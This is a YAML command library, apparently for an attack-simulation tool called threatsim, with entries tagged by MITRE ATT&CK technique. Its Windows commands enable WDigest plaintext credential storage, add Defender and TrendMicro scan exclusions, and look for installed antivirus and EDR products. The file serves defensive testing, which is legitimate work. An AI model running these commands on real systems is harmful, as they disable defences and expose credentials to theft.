
---
commands:
   enable_wdigest:
      remote: false
      id: enable_wdigest
      command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Modify WDigest Setting to allow storing of plaintext credentials.'
   defender_reg_exclusion:
      remote: false
      id: defender_reg_exclusion
      command: 'cmd.exe /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v $CURDIR$ /t REG_DWORD /d 0 /f'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Exclude threatsim.exe from Windows Defender.'
   trendmicro_reg_exclusion:
      remote: false
      id: trendmicro_reg_exclusion
      command: 'REG ADD "HKLM\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v $CURDIR$ /t REG_DWORD /d 1 /f'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Exclude threatsim.exe from TrendMicro.'
   find_av_edr_findstr_1:
      remote: false
      id: find_av_edr_findstr_1
      command: 'cmd.exe /c dir "C:\Program Files" | findstr /i "Avast McAfee TrendMicro Avira F-Secure Norton MalwareBytes drweb kaspersky"'
      stealth: low
      mitre:
         - 'Discovery;T1518.001;Software Discovery: Security Software Discovery'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Scanning Program Files directory for common antivirus/EDR products.'